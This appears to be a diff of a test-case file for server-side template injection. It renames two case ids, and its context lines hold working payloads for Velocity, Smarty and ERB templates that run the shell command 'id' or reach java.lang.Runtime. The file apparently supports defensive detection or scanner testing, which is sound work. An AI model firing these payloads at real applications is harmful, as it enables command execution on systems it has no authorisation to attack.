@@ -51,7 +51,7 @@ payload = "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\")"
 
 # Smarty
 [[case]]
-id = "smarty_php_block"
+id = "smarty_php_block_backtick"
 class = "ssti"
 payload = "{php}echo `id`;{/php}"
 
@@ -67,7 +67,7 @@ class = "ssti"
 payload = "<%= `id` %>"
 
 [[case]]
-id = "erb_eval"
+id = "erb_eval_system"
 class = "ssti"
 payload = "<%= system('id') %>"
 
